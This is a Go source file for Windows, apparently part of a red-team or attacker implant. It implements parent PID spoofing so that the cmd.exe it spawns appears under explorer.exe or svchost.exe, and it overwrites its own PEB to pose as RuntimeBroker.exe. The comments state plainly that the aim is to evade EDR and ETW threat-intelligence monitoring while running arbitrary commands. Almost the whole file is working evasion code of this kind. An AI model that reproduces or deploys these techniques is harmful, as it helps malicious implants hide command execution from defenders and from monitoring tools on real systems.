//go:build windows

package main

import (
	"crypto/rand"
	"os"
	"strings"
	"syscall"
	"unsafe"
)

// ── Parent PID Spoofing & Process Masquerading ──────────────────────────────
//
// The Kernel-level ETW Threat Intelligence (TI) provider monitors:
//   - Process creation lineage (what spawned what)
//   - Cross-process memory operations (injection)
//   - Suspicious parent-child relationships
//
// We can't bypass kernel ETW from userland, but we can minimize what
// triggers it:
//
//   1. Parent PID Spoofing: When the implant spawns cmd.exe for command
//      execution, we can set the parent PID to explorer.exe or svchost.exe.
//      This makes the process tree look legitimate:
//        explorer.exe → cmd.exe (normal)
//        vs. unknown.exe → cmd.exe (suspicious)
//
//   2. Process Masquerading: Set the command line and image name in the
//      PEB to appear as a legitimate Windows process.
//
// Limitation: PPID spoofing changes the *reported* parent, but the kernel
// still has the real creation record. Advanced EDR correlation can detect
// the mismatch. This is effective against tools that only check the PEB.

const (
	PROC_THREAD_ATTRIBUTE_PARENT_PROCESS = 0x00020000
	EXTENDED_STARTUPINFO_PRESENT         = 0x00080000
)

type startupInfoEx struct {
	syscall.StartupInfo
	AttributeList *byte
}

var (
	procInitializeProcThreadAttributeList = syscall.NewLazyDLL("kernel32.dll").NewProc("InitializeProcThreadAttributeList")
	procUpdateProcThreadAttribute         = syscall.NewLazyDLL("kernel32.dll").NewProc("UpdateProcThreadAttribute")
	procDeleteProcThreadAttributeList     = syscall.NewLazyDLL("kernel32.dll").NewProc("DeleteProcThreadAttributeList")
)

// findProcessByName returns the PID of a process by name.
// Used to find explorer.exe or svchost.exe for PPID spoofing.
func findProcessByName(targetName string) (uint32, error) {
	snapshot, err := syscall.CreateToolhelp32Snapshot(0x2, 0) // TH32CS_SNAPPROCESS
	if err != nil {
		return 0, err
	}
	defer syscall.CloseHandle(snapshot)

	var entry syscall.ProcessEntry32
	entry.Size = uint32(unsafe.Sizeof(entry))

	err = syscall.Process32First(snapshot, &entry)
	for err == nil {
		name := syscall.UTF16ToString(entry.ExeFile[:])
		if strings.EqualFold(name, targetName) {
			return entry.ProcessID, nil
		}
		err = syscall.Process32Next(snapshot, &entry)
	}

	return 0, os.ErrNotExist
}

// execCmdWithPPIDSpoof executes a command with a spoofed parent PID.
// The spawned cmd.exe appears as a child of the specified parent process
// (e.g., explorer.exe) instead of our implant.
func execCmdWithPPIDSpoof(command string) []byte {
	// Find a legitimate parent process
	parentPID, err := findProcessByName("explorer.exe")
	if err != nil {
		// Fallback to svchost.exe
		parentPID, err = findProcessByName("svchost.exe")
		if err != nil {
			// No spoofing available — fall back to normal exec
			return execCmd(command)
		}
	}

	// Open the parent process
	parentHandle, err := syscall.OpenProcess(
		0x0080, // PROCESS_CREATE_PROCESS
		false,
		parentPID,
	)
	if err != nil {
		return execCmd(command)
	}
	defer syscall.CloseHandle(parentHandle)

	// Initialize the proc thread attribute list
	var attrListSize uintptr
	procInitializeProcThreadAttributeList.Call(
		0,
		1, // count of attributes
		0,
		uintptr(unsafe.Pointer(&attrListSize)),
	)

	attrListBuf := make([]byte, attrListSize)
	attrList := &attrListBuf[0]

	r1, _, _ := procInitializeProcThreadAttributeList.Call(
		uintptr(unsafe.Pointer(attrList)),
		1,
		0,
		uintptr(unsafe.Pointer(&attrListSize)),
	)
	if r1 == 0 {
		return execCmd(command)
	}
	defer procDeleteProcThreadAttributeList.Call(uintptr(unsafe.Pointer(attrList)))

	// Set the parent process attribute
	r1, _, _ = procUpdateProcThreadAttribute.Call(
		uintptr(unsafe.Pointer(attrList)),
		0,
		PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
		uintptr(unsafe.Pointer(&parentHandle)),
		unsafe.Sizeof(parentHandle),
		0,
		0,
	)
	if r1 == 0 {
		return execCmd(command)
	}

	// Create the process with the spoofed parent
	si := startupInfoEx{}
	si.Cb = uint32(unsafe.Sizeof(si))
	si.AttributeList = attrList

	var pi syscall.ProcessInformation

	cmdLine, _ := syscall.UTF16PtrFromString("cmd.exe /c " + command)

	createProcess := syscall.NewLazyDLL("kernel32.dll").NewProc("CreateProcessW")
	r1, _, err = createProcess.Call(
		0,
		uintptr(unsafe.Pointer(cmdLine)),
		0, 0,
		0, // don't inherit handles
		EXTENDED_STARTUPINFO_PRESENT|syscall.CREATE_NO_WINDOW,
		0,
		0,
		uintptr(unsafe.Pointer(&si)),
		uintptr(unsafe.Pointer(&pi)),
	)
	if r1 == 0 {
		return execCmd(command)
	}

	// Wait for the process to complete and read output
	// Note: PPID-spoofed processes can't use pipes easily.
	// We wait for completion, then try to capture output via temp file.
	syscall.WaitForSingleObject(pi.Process, syscall.INFINITE)
	syscall.CloseHandle(pi.Process)
	syscall.CloseHandle(pi.Thread)

	// Since we can't capture stdout from a PPID-spoofed process easily,
	// we use a temp file for output redirection
	return execCmdViaTempFile(command, parentHandle)
}

// execCmdViaTempFile runs a command and captures output via a temp file.
// Used when direct pipe-based output capture isn't available (PPID spoofing).
func execCmdViaTempFile(command string, _ syscall.Handle) []byte {
	tmpFile := os.TempDir() + `\rta_` + randomHex(8) + `.tmp`
	defer os.Remove(tmpFile)

	// Use normal exec but redirect to temp file
	fullCmd := `cmd.exe /c "` + command + `" > "` + tmpFile + `" 2>&1`
	cmd := execCmd(fullCmd)

	// Read the temp file
	data, err := os.ReadFile(tmpFile)
	if err != nil {
		return cmd // fall back to direct output
	}
	return data
}

// randomHex generates a random hex string of the specified byte length.
func randomHex(n int) string {
	b := make([]byte, n)
	rand.Read(b)
	const hex = "0123456789abcdef"
	out := make([]byte, n*2)
	for i, v := range b {
		out[i*2] = hex[v>>4]
		out[i*2+1] = hex[v&0x0f]
	}
	return string(out)
}

// ── Process Masquerading ────────────────────────────────────────────────────
// Modifies the PEB (Process Environment Block) to change the reported
// image path and command line. Makes the process appear as a legitimate
// Windows binary in task managers and some EDR tools.
//
// Note: This modifies the PEB in userland only. Kernel-level tools
// (Process Monitor, kernel callbacks) still see the real image.

// masqueradeProcess changes the PEB command line and image path
// to appear as a legitimate Windows process.
func masqueradeProcess() {
	// We modify the command line visible via NtQueryInformationProcess
	// and the image path name in the PEB.
	//
	// Target: appear as RuntimeBroker.exe or SearchHost.exe
	// These are legitimate Windows processes that make HTTPS connections.

	ntdll := syscall.NewLazyDLL("ntdll.dll")
	rtlInitUnicodeString := ntdll.NewProc("RtlInitUnicodeString")

	// Get the PEB address
	type processBasicInformation struct {
		ExitStatus                   uintptr
		PebBaseAddress               uintptr
		AffinityMask                 uintptr
		BasePriority                 int32
		UniqueProcessId              uintptr
		InheritedFromUniqueProcessId uintptr
	}

	var pbi processBasicInformation
	var returnLength uint32

	ntQueryInformationProcess := ntdll.NewProc("NtQueryInformationProcess")
	r1, _, _ := ntQueryInformationProcess.Call(
		uintptr(0xFFFFFFFFFFFFFFFF), // current process pseudo-handle
		0,                           // ProcessBasicInformation
		uintptr(unsafe.Pointer(&pbi)),
		unsafe.Sizeof(pbi),
		uintptr(unsafe.Pointer(&returnLength)),
	)
	if r1 != 0 {
		return
	}

	// PEB → ProcessParameters offset: 0x20 on x64
	processParams := *(*uintptr)(unsafe.Pointer(pbi.PebBaseAddress + 0x20))
	if processParams == 0 {
		return
	}

	// RTL_USER_PROCESS_PARAMETERS layout:
	// Offset 0x60: ImagePathName (UNICODE_STRING)
	// Offset 0x70: CommandLine (UNICODE_STRING)
	fakePath := `C:\Windows\System32\RuntimeBroker.exe`
	fakeCmd := `C:\Windows\System32\RuntimeBroker.exe -Embedding`

	fakePathUTF16, _ := syscall.UTF16PtrFromString(fakePath)
	fakeCmdUTF16, _ := syscall.UTF16PtrFromString(fakeCmd)

	// Overwrite ImagePathName
	rtlInitUnicodeString.Call(
		processParams+0x60,
		uintptr(unsafe.Pointer(fakePathUTF16)),
	)

	// Overwrite CommandLine
	rtlInitUnicodeString.Call(
		processParams+0x70,
		uintptr(unsafe.Pointer(fakeCmdUTF16)),
	)
}
